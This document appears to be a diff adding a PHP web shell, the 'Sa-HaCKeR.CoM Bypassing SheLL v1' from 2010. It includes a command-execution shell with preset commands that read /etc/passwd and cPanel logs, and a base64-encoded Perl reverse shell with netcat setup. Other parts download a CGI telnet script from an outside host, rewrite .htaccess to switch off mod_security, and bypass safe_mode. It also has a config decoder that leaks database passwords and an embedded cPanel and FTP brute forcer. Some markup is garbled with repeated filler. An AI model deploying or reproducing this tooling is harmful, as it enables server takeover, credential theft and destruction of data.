+<form name="form" action="?a=decode" method="post">
+<tr><td><input name="file" value="config.php" /></td></tr>
+<input type="submit" name="Connect" value="Decode" />
+<br>
+<?
+$a = $_GET['a'];
+if($a=='decode' && isset($_POST['file']))
+{
+$file = $_POST['file'];
+include $file;
+?>
+<? echo $config['MasterServer']['servername']."\n"; ?><br>
+<? echo $config['Database']['dbname']."\n"; ?><br>
+<? echo $config['MasterServer']['username']."\n"; ?><br>
+<? echo $config['MasterServer']['password']."\n"; ?><br>
+<?
+}
+if ($a=='config')
+{
+}
+?>
+<?PHP
+
+}
+
+//Php 4 Back
+function ephp4()
+{
+	@unlink('.htaccess');
+$H = fopen('.htaccess','w+');
+$Str = '<Files *.php>
+   ForceType application/x-httpd-php4
+</Files>';
+if(fwrite($H,$Str)){
+echo "[+] Evil File Created Succes ! \n";
+}
+fclose($H);
+break;
+
+}
+
+//Php 4.x Bypass
+function e444()
+{
+
+?>
+<?
+/*
+www.securitywall.org 
+Safe Mode Command Execution Shell
+*/
+function safeshell($komut) 
+{ 
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+ $res = ''; 
+ if (!empty($komut)) 
+ { 
+if(function_exists('exec')) 
+{ 
+ @exec($komut,$res); 
+ $res = join("\n",$res); 
+} 
+elseif(function_exists('shell_exec')) 
+{ 
+ $res = @shell_exec($komut); 
+} 
+elseif(function_exists('system')) 
+{ 
+ @ob_start(); 
+ @system($komut); 
+ $res = @ob_get_contents(); 
+ @ob_end_clean(); 
+} 
+elseif(function_exists('passthru')) 
+{ 
+ @ob_start(); 
+ @passthru($komut); 
+ $res = @ob_get_contents(); 
+ @ob_end_clean(); 
+} 
+elseif(@is_resource($f = @popen($komut,"r"))) 
+{ 
+$res = ""; 
+while(!@feof($f)) { $res .= @fread($f,1024); } 
+@pclose($f); 
+} 
+ } 
+ return $res; 
+}
+echo "<b><font color=blue>Safe Mode Command Execution Bypass Exploit</font></b><br>";
+print_r('
+<pre>
+<form method="POST" action="">
+<b><font color=blue>Command :</font></b><input name="baba" type="text"><input value="Execute" type="submit">
+</form>
+<form method="POST" action="">
+<b><font color=blue>Ready Command :=) :</font><select size="1" name="liz0">
+<option value="cat /etc/passwd">/etc/passwd</option>
+<option value="netstat -an | grep -i listen">All open Portalari Gor</option>
+<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
+<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
+<option value="cat /etc/hosts">/etc/hosts</option>
+<option value="cat /etc/named.conf">/etc/named.conf</option>
+<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
+<option value="ls -la /etc/virtual">ls -la /etc/virtual</option>
+<option value="ls -la /etc/vdomainaliases">ls -la /etc/vdomainaliases</option>
+<option value="ls -la /etc/vfilters">ls -la /etc/vfilters</option>
+<option value="find PATH -perm 777 -type d">Yzilabilir Directories</option>
+<option value="cat /etc/passwd | grep cpanel > 1;cat 1">p1</option>
+<option value="cut -d: -f 6 1 >2;cat 2">p2</option>
+</select> <input type="submit" value="Sonuc">
+</form>
+</pre>
+');
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+if($_POST[baba]!= "") { $liz0=safeshell($_POST[baba]); }
+if($_POST[liz0]!= "") { $liz0zim=safeshell($_POST[liz0]); }
+$uid=safeshell('id');
+$server=safeshell('uname -a');
+echo "<pre><h4>";
+echo "<b><font color=red>Information:</font></b>:$uid<br>";
+echo "<b><font color=red>Server</font></b>:$server<br>";
+echo "<b><font color=red>Command Results:</font></b><br>"; 
+if($_POST["baba"]!= "") { echo $liz0; }
+if($_POST["liz0"]!= "") { echo $liz0zim; }
+echo "</h4></pre>";
+?>
+<?php
+}
+
+
+//Perl cgi
+function ecgi()
+{
+
+$kokdosya = ".htaccess";
+
+$dosya_adi = "$kokdosya";
+$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
+$metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
+
+AddType application/x-httpd-cgi .sa
+
+AddHandler cgi-script .sa
+AddHandler cgi-script .sa";	
+fwrite ( $dosya , $metin ) ;
+fclose ($dosya);
+
+?>
+<?php 
+
+$file = fopen("izo.sa" ,"w+"); 
+
+$sa=file_get_contents('http://www.rohitab.com/cgiscripts/cgitelnet.txt'); 
+
+$write = fwrite ($file ,$sa); 
+
+fclose($file); 
+
+if ($write) { 
+
+echo "The File Was Created Successfuly.</br>"; 
+
+} 
+else {echo'"error"';} 
+
+$chm = chmod("izo.sa" , 0755); 
+
+if ($chm == true){ 
+    echo "chmoded the file to 755"; 
+}else{ 
+    echo "sorry file didn't chmoded"; 
+} 
+?>
+<?php
+}
+
+//ln -s bypass
+function elns()
+{
+
+$kokdosya = ".htaccess";
+
+$dosya_adi = "$kokdosya";
+$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
+$metin = "Options +FollowSymLinks
+DirectoryIndex seees.html
+RemoveHandler .php
+";	
+fwrite ( $dosya , $metin ) ;
+fclose ($dosya);
+
+}
+
+//Apachi Bypass
+function eapachi()
+{
+
+$kokdosya = ".htaccess";
+
+$dosya_adi = "$kokdosya";
+$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
+$metin = "<IfModule mod_security.c>
+ SecFilterEngine Off
+ SecFilterScanPOST Off
+</IfModule>";	
+fwrite ( $dosya , $metin ) ;
+fclose ($dosya);
+	
+
+}
+
+
+//Working with MySQL
+function emysql()
+{
+	$cquery = $_POST['query'];
+	$querys = @explode(';',$cquery);
+	$dbhost = $_POST['dbhost']?$_POST['dbhost']:"localhost";
+	$dbport = $_POST['dbport']?$_POST['dbport']:"3306";
+	$dbuser = $_POST['dbuser'];
+	$dbpass = $_POST['dbpass'];
+	$dbname = $_POST['dbname'];
+	if ($cquery  == "") {
+		$cquery  = "-- SHOW DATABASES;\n-- SHOW TABLES FROM <database>;\n-- SHOW COLUMNS FROM <table>;";
+	}
+	echo '
+	<center><h3> Working with MySQL </h3></center>
+	<center>
+	<form method="POST" action="">
+	<input type="hidden" name="id" value="mysql">
+	DBHost: <input type="text" size="8" name="dbhost" value="',$dbhost,'" class="input" />&nbsp;
+	DBPort: <input type="text" size="5" name="dbport" value="',$dbport,'" class="input" />&nbsp;
+	DBUser: <input type="text" size="10" name="dbuser" value="',$dbuser,'" class="input" />&nbsp;
+	DBPass: <input type="text" size="10" name="dbpass" value="',$dbpass,'" class="input" />&nbsp;
+	DBName: <input type="text" size="10" name="dbname" value="',$dbname,'" class="input" /><br><br>
+	<textarea name ="query" rows="7" cols=90 class="textarea">',$cquery,'</textarea><br><br>
+	<input type="submit" name="go" value="     Go     " class="button">
+	</form>';
+	if($_POST['go']) {
+		$connect = @mysql_connect($dbhost.":".$dbport, $dbuser, $dbpass);
+
+		if (!$connect)	{ echo '<textarea rows=3 cols=80 class="textarea">Could not connect: ',mysql_error(),'</textarea>';	}
+		else {
+			@mysql_select_db($dbname, $connect);
+			echo '<div style="overflow:auto; height:400px;width:1000px;">';
+			foreach($querys as $num=>$query){
+				if(strlen($query)>5){
+					echo '<font face=Verdana size=-2 color=orange><b>Query#'.$num.' : '.htmlspecialchars($query).'</b></font><br>';
+					$res = @mysql_query($query,$connect);
+					$error = @mysql_error($connect);
+					if($error) { echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>'.$error.'</b></font></td></tr></table><br>'; }
+					else {
+						if (@mysql_num_rows($res) > 0){
+							$sql2 = $sql = $keys = $values = '';
+							while (($row = @mysql_fetch_assoc($res))){
+								$keys = @implode('&nbsp;</b></font></td><td bgcolor=blue><font color=white face=Verdana size=-2><b>&nbsp;', @array_keys($row));
+								$values = @array_values($row);
+								foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
+								$values = @implode('&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;',$values);
+								$sql2 .= '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
+							}
+							echo '<table width=100%>';
+							$sql  = '<tr><td bgcolor=blue><font face=Verdana color=white size=-2><b>&nbsp;'.$keys.'&nbsp;</b></font></td></tr>';
+							$sql .= $sql2;
+							echo $sql;
+							echo '</table><br>';
+						}
+						else { if(($rows = @mysql_affected_rows($connect))>=0) { echo '<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>'.$rows.'</b></font></td></tr></table><br>'; } }
+					}
+					@mysql_free_result($res);
+				}
+			}
+			echo '</div><br>';
+			@mysql_close($connect);
+		}
+	}
+}
+
+
+//Back Connect
+function eback()
+{
+	$bc_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
+aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
+hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
+sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
+kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
+KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
+OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
+	echo '
+	<p align="center"><font size="5"><b> Back Connecting </b></font></p>
+	<p align="center"><font color="#DD8008">Run NetCat on your machine:</font><i><font color="#FF0000"> nc -l -p 1542</font></i>
+	</p><br><hr><br><p align="center"><font color="#DD8008">Then input your IP and Port</font></p>
+	<div align="center"><form method="POST" action="">
+	<input type="text" name="pip" value="',$_SERVER['REMOTE_ADDR'],'" class="input" /> :
+	<input type="text" name="pport" size="5" value="1542" class="input" /> <br><br>
+	<input type="text" name="ppath" value="/tmp" class="input" /><br><br>
+	<input type="submit" value=" Connect " class="button" />
+	</form></div>';
+	$pip=$_POST['pip'];		$pport=$_POST['pport'];
+	if ($pip <> '') {
+		$fp=fopen($_POST['ppath'].DS.rand(0,10).'bc_perl_enhack.pl', 'w');
+		if (!$fp){
+			$result = 'Error: couldn\'t write file to open socket connection';
+		} else {
+			@fputs($fp,@base64_decode($bc_perl));
+			fclose($fp);
+			$result = ex('perl '.$_POST['ppath'].'/bc_perl_enhack.pl '.$pip.' '.$pport.' &');
+		}
+	}
+}
+
+
+//File Edit
+function fedit()
+{
+	$fedit=$_GET['fedit'];
+	if(is_file($fedit)) {
+		if ($fedit != "" ){
+			$fedit=realpath($fedit);
+			$lines = file($fedit);
+			echo '
+			<center><br><form action="" method="POST">
+			<textarea name="savefile" rows="33" cols="100">' ;
+
+			foreach ($lines as $line_num => $line) {
+				echo htmlspecialchars($line);
+			}
+			echo '
+			</textarea><br><br>
+			<input type="text" name="filepath"  size="60" value="',$fedit,'" class="input" />&nbsp;
+			<input type="submit" value=" Save " class="button" /></form>';
+			$savefile=stripslashes($_POST['savefile']);
+			$filepath=realpath($_POST['filepath']);
+			if ($savefile <> "") {
+				$fp=@fopen("$filepath","w+");
+				if($fp){
+					fwrite($fp,"") ;
+					fwrite($fp,$savefile) ;
+					fclose($fp);
+					echo '<script language="javascript"> alert("File Saved!")</script>';
+				} else {
+					echo '<script language="javascript"> alert("Save Failed!")</script>';
+				}
+				echo '<script language="javascript"> window.location = "http://'.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'"</script>';
+			}
+			exit();
+		}
+	}
+	else {
+		echo '<u>',$fedit,'</u> is not file. <br />
+		<a href="javascript:history.go(-1)"><-- back</a>
+		';
+	}
+}
+
+
+// Execute
+function ex($param) {
+	$res = '';
+	if (!empty($param)){
+		if(function_exists('exec'))	{
+			@exec($param,$res);
+			$res = join("\n",$res);
+		}
+		elseif(function_exists('shell_exec'))	{
+			$res = @shell_exec($param);
+		}
+		elseif(function_exists('system'))	{
+			@ob_start();
+			@system($param);
+			$res = @ob_get_contents();
+			@ob_end_clean();
+		}
+		elseif(function_exists('passthru'))	{
+			@ob_start();
+			@passthru($param);
+			$res = @ob_get_contents();
+			@ob_end_clean();
+		}
+		elseif(@is_resource($f = @popen($param,"r")))	{
+			$res = "";
+			while(!@feof($f)) { $res .= @fread($f,1024); }
+			@pclose($f);
+		}
+	}
+	return $res;
+}
+
+//Upload File
+$rpath=@$_POST['Fupath'];
+if ($rpath <> "") {
+	$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
+	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+		echo '<script language="javascript"> alert("\:D Upload successfully!")</script>';
+	} else {
+		echo '<script language="javascript"> alert("\:( Upload Failed!")</script>';
+	}
+}
+
+//Delete file
+$frpath=@$_GET['fdelete'];
+
+function rmdirr($dirname)
+{
+    // Sanity check
+    if (!file_exists($dirname)) {
+        return false;
+    }
+
+    // Simple delete for a file
+    if (is_file($dirname) || is_link($dirname)) {
+        return unlink($dirname);
+    }
+
+    // Loop through the folder
+    $dir = dir($dirname);
+    while (false !== $entry = $dir->read()) {
+        // Skip pointers
+        if ($entry == '.' || $entry == '..') {
+            continue;
+        }
+
+        // Recurse
+        rmdirr($dirname . DIRECTORY_SEPARATOR . $entry);
+    }
+
+    // Clean up
+    $dir->close();
+    return rmdir($dirname);
+}
+
+if ($frpath <> "") {
+	if(rmdirr($frpath)) {
+		echo '<script language="javascript"> alert("Done! Press F5 to refresh")</script>';
+	} else {
+		echo '<script language="javascript"> alert("Fail! Press F5 to refresh")</script>';
+	}
+	echo '<script language="javascript"> history.back(2)</script>';
+	exit(0);
+}
+?>
+
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>:: Sa-HaCKeR.CoM Bypassing SheLL v1 ::</title>
+<style>
+<!--
+body {
+	font-family: Tahoma; font-size: 8pt; color:#00FF00;
+	background-color:#000;
+}
+.td {
+	font-size:80%;
+}
+a:link {
+	text-decoration: none;
+	color: #0080FF
+}
+a:visited {
+	text-decoration: none;
+	color: #0080FF
+}
+a:active {
+	text-decoration: none;
+	color: #0080FF
+}
+a:hover {
+	text-decoration: underline overline;
+	color: #FF0000
+}
+
+.input {
+	border:  1px solid #0c9904 ;
+	BACKGROUND-COLOR: #333333;
+	font: 10pt tahoma;
+	color: #ffffff;
+}
+
+.button {
+	font-size: 13px;
+	color:#0c9904;
+	BACKGROUND-COLOR: #333333;
+	border:  1px solid #0c9904;
+}
+
+.textarea {
+	border:  1px solid #0c9904 ;
+	BACKGROUND-COLOR: #333333;
+	font: Fixedsys bold;
+	color: #ffffff;
+}
+
+#phpinfo {
+	width:80%;
+	font-size:80%;
+	padding-left10px;
+}
+#phpinfo table ,
+#phpinfo td ,
+#phpinfo tr {
+	border:1px solid #9fe3a2;
+}
+#phpinfo pre {}
+#phpinfo a:link {
+	color:red;
+}
+#phpinfo a:hover {}
+#phpinfo table {}
+#phpinfo .center {}
+#phpinfo .center table {}
+#phpinfo .center th {}
+#phpinfo td, th {}
+#phpinfo h1 {
+	font-size:120%;
+}
+#phpinfo h2 {
+	text-decoration:underline;
+	color:#75d584;
+}
+#phpinfo .p {
+ font-size:90%;
+ color:red;
+}
+#phpinfo .e {
+	font-size:80%;
+}
+#phpinfo .h {
+}
+#phpinfo .v {
+	font-size:75%;
+	color:#3e9e25;
+}
+#phpinfo .vr {}
+#phpinfo img {}
+#phpinfo hr {}
+-->
+</style>
+</head>
+
+<body>
+<?php
+error_reporting(E_ERROR | E_WARNING | E_PARSE);
+
+
+// Change mode
+$fchmod=$_GET['fchmod'];
+if ($fchmod <> "" ){
+	$fchmod=realpath($fchmod);
+	echo '<center><font size="3"><br>
+	Chang mode ',$fchmod,'<br>
+	<form method="POST" action=""><br>
+	<br>
+	<input type="text" name="mode" size="4" class="input" />&nbsp;
+	<input type="submit" value="chmod" class="button" />
+	</form><br>';
+	$mode=$_POST['mode'];
+	if ($mode != ""){
+		if(chmod($fchmod , $mode)) {
+			echo "Successfully";
+		} else {
+			echo "Permission denied";
+		}
+	}
+	echo '</font>';
+	exit();
+}
+?>
+
+<div align="center">
+	<p align="center">
+		<font face=Webdings size=10><b>!</b></font>
+		<SPAN style="FONT-SIZE: 23pt; COLOR: #00CCFF; FONT-FAMILY: Impact">&nbsp;Sa-HaCKeR.CoM Bypassing SheLL v1&nbsp;</SPAN>
+		<font face=Webdings size=10><b>!</b></font>
+		<br/>Released 2010
+	</p>
+	<table border="1" width="98%" style="border: 1px solid #0080FF" cellspacing="0" cellpadding="0" height="600">
+		<tr>
+			<td valign="top" rowspan="2">
+				<p align="center"><b>
+					<br><a href="?"><img border="0" src="http://img54.imageshack.us/img54/7688/sahack.png"></a>
+				</p>
+				<p align="center">=====[~]=====</p>
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=fm&dir=<?php	echo getcwd();	?>	">File Manager</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=cmd">Web Command</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=eval">PHP Evaluator</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=izo">Php 5.2.9 Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=priv8">Safe Mode Off</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=obypass">Openbasedir Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="green">
+					<a href="?id=decode">Vbulletin config decoder</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=php4">Php 4 Back</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=444">Php 4.4.x Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=cgi">Perl cgi</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=lns">ln -s bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=apachi">Apachi Bypass</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?x=">Nitrojen Bombasi</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?panel=cp">Cpanel crack</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=bcon">Back Connect</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=mysql">MySQL Query</a>
+				</font></b></p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<a href="?id=info">Server Infos</a>
+				</font></b></p>
+
+				<p align="center">=====[~]=====</p>
+
+				<p align="center"><b>
+				<font face="Tahoma" size="2" color="#0080FF">
+					<img border="0" src="http://www.sa-hacker.com/vb/index.php"></a>
+				</font></b></p>
+			</td>
+			<td valign="top" height="500" width="85%" style="border: 1px solid #0080FF" align="left">
+			<?php
+			// swich to function called base on id
+			$cmdid = $_GET['id'];
+			switch ($cmdid) {
+				// File Manager
+				case 'fm':
+					fileman ();
+					break;
+				// Command Line
+				case 'cmd':
+					wcom();
+					break;
+				// PHP Eval
+				case 'eval':
+					eeval();
+					break;
+				// Php 5.2.9 Bypass
+				case 'izo':
+					eizo();
+					break;
+				// Safe Modu Offla
+				case 'priv8':
+					epriv8();
+					break;
+				// Openbasedir Bypass
+				case 'obypass':
+					eobypass();
+					break;
+				// Vbulletin config decoder
+				case 'decode':
+					edecode();
+					break;				
+				// Php 4 Back
+				case 'php4':
+					ephp4();
+					break;
+				// Php 4.4.x Bypass
+				case '444':
+					e444();
+					break;
+				// Perl cgi
+				case 'cgi':
+					ecgi();
+					break;
+				// ln -s bypass
+				case 'lns':
+					elns();
+					break;
+				// Apachi Bypass
+				case 'apachi':
+					eapachi();
+					break;
+                                // Work with MySQL
+				case 'mysql':
+					emysql();
+					break;
+				// Back connect
+				case 'bcon':
+					eback();
+					break;
+				// File Edit
+				case 'fedit':
+					fedit();
+					break;
+				// Php Info
+				case 'info':
+					info();
+					break;
+				// Default
+				default: def();
+			}
+			//*******************************************************
+
+			?>
+			</td>
+		</tr>
+		<tr>
+			<td style="border: 1px solid #0080FF">
+			<p align="center">
+			<font color="#FF0000" size="2"><b>:::::::::::::::: [ :: Copyright &copy 2010 - Developed</a> by <a href="http://www.sa-hacker.com">sa-hacker Security Team</a> :: ] :::::::::::::::: </b></font>
+			</p></td>
+		</tr>
+	</table>
+</div>
+</font>
+</body>
+</html>
+<?php
+$mode="cp";//????????????.
+if($_REQUEST['panel']!=$mode)
+{
+   echo "<iframe src=cp width=100% height=100% frameborder=0></iframe> ";
+exit;
+}
+?>
+<html> 
+<head> 
+<sakincali kodsakincali kodsakincali kodsakincali kod sakincali kodsakincali kodsakincali kodsakincali kodsakincali kodsakincali kodsakincali kodsakincali kodsakincali kodsakincali kod="Content-Language" content="en-us"> 
+</head> 
+<title>Aria cPanel cracker version : 1.0</title> 
+<style> 
+body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;} 
+input, 
+.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;} 
+button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;} 
+body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;} 
+a:active { outline: none; } 
+a:focus { -moz-outline-style: none; } 
+</style> 
+  <style type='text/css'> 
+  <!-- 
+       A:link {text-decoration: none; color:#cccccc } 
+       A:visited {text-decoration: none; color:#cccccc } 
+       a:hover {text-decoration: none; color:#000000} 
+  --> 
+</style> 
+<?php 
+/* This Code was originaly written by Aria-Security Team [Persian Security Network] 
+we are not responsible for any damage/usage done with this script  
+    http://Aria-Security.com 
+*/ 
+@ini_set('memory_limit', 1000000000000); 
+$connect_timeout=5; 
+@set_time_limit(0); 
+$submit = $_REQUEST['submit']; 
+$users = $_REQUEST['users']; 
+$pass = $_REQUEST['passwords']; 
+$target = $_REQUEST['target']; 
+$option = $_REQUEST['option']; 
+$page = $_GET['page']; 
+
+if($target == ''){ 
+$target = 'localhost'; 
+} 
+?> 
+
+<?php 
+ print "<br><br><br><center><TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='70%' bgColor=#303030 borderColorLight=#666666 border=1><tr><td width='70%'> 
+<br><b><center><a href='?panel=cp&page=bio'> About </a> - <a href='?panel=cp&page=crack'> crack </a> - <a href='?panel=cp&page=users'> grab users </a><br><br></center></td></tr></table>"; 
+ if ( $page == 'bio' ){ 
+print  
+"<br><br><TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%'bgColor=#303030 borderColorLight=#666666 border=1><tr><td> 
+<br><b>Please enter your USERNAME and PASSWORD to logon<br> 
+user<br> 
+220 +ok<br> 
+pass ********<br> 
+220 +ok login successful<br> 
+[ agramksa@w.cn ]# info<b><br><font face=tahoma><br> 
+<font color='red' >sa-hacker.com cPanel cracker version : 1.0 </font><b><br><br> 
+Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir bypasser ... more stuff will be included in the next version<br> 
+Our website , <a href='http://www.sa-hacker.com'> http://www.sa-hacker.com</a><br> 
+</center><br></td></tr></table>"; 
+ }elseif( $page == 'crack'){ 
+ // Aria-Security Team [Persian Security Network] 
+@ini_set('memory_limit', 1000000000000); 
+$connect_timeout=5; 
+@set_time_limit(0); 
+$submit = $_REQUEST['submit']; 
+$users = $_REQUEST['users']; 
+$pass = $_REQUEST['passwords']; 
+$target = $_REQUEST['target']; 
+$option = $_REQUEST['option']; 
+if($target == ''){ 
+$target = 'localhost'; 
+} 
+print " <div align='center'> 
+<form method='post' style='border: 1px solid #000000'><br><br> 
+<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#666666 border=1><tr><td> 
+<b> Target  : </font><input type='text' name='target' size='16' value= $target style='border: font-family:Verdana; font-weight:bold;'></p></font></b></p> 
+<div align='center'><br> 
+<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#666666 border=1> 
+<tr> 
+<td align='center'> 
+<b>Username</b></td> 
+<td> 
+<p align='center'> 
+<b>Password</b></td> 
+</tr> 
+</table> 
+<p align='center'> 
+<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$users</textarea> 
+<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$pass</textarea><br> 
+<br>                          
+<b>Options : </span><input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel  
+<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp ==> <input type='submit' value='brute' name='submit' ></p> 
+</td></tr></table></td></tr></form><p align= 'left'>"; 
+?> 
+<?php 
+function ftp_check($host,$user,$pass,$timeout){ 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, "ftp://$host"); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); 
+curl_setopt($ch, CURLOPT_FTPLISTONLY, 1); 
+curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass"); 
+curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
+curl_setopt($ch, CURLOPT_FAILONERROR, 1); 
+$data = curl_exec($ch); 
+if ( curl_errno($ch) == 28 ) { 
+
+print "<b> Error : Connection timed out , make confidence about validation of target !</b>"; 
+exit;} 
+
+elseif ( curl_errno($ch) == 0 ){ 
+
+print  
+"<b>[ user@aria-security.com ]# </b> 
+<b> Attacking has been done , found username , <font color='#FF0000'> $user </font> and password ,  
+<font color='#FF0000'> $pass </font></b><br>";}curl_close($ch);} 
+
+function cpanel_check($host,$user,$pass,$timeout){ 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, "http://$host:2082"); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); 
+curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass"); 
+curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
+curl_setopt($ch, CURLOPT_FAILONERROR, 1); 
+$data = curl_exec($ch); 
+if ( curl_errno($ch) == 28 ) {  
+print "<b> Error : Connection timed out , make confidence about validation of target !</b>"; 
+exit;} 
+elseif ( curl_errno($ch) == 0 ){ 
+
+print  
+"<b>[ user@aria-security.com ]# </b> 
+<b>Attacking has been done , found username , <font color='#FF0000'> $user </font> and password ,  
+<font color='#FF0000'> $pass </font></b><br>";}curl_close($ch);} 
+
+if(isset($submit) && !empty($submit)){ 
+
+$userlist = explode ("\n" , $users ); 
+$passlist = explode ("\n" , $pass ); 
+print "<b>[ user@aria-security.com ]# Attacking ...</font></b><br>"; 
+foreach ($userlist as $user) { 
+$_user = trim($user); 
+foreach ($passlist as $password ) { 
+$_pass = trim($password); 
+if($option == "ftp"){ 
+ftp_check($target,$_user,$_pass,$connect_timeout); 
+} 
+if ($option == "cpanel") 
+{ 
+cpanel_check($target,$_user,$_pass,$connect_timeout); 
+} 
+} 
+} 
+} 
+}elseif ( $page == 'users'){ 
+echo "<br><br><TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%'bgColor=#303030 borderColorLight=#666666 border=1><tr><td>"; 
+echo '<p><form name="form" action="" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="grab !"></form>'; 
+$file = $_POST['file']; 
+$level=0; 
+if(!file_exists("file:")) 
+    @mkdir("file:"); 
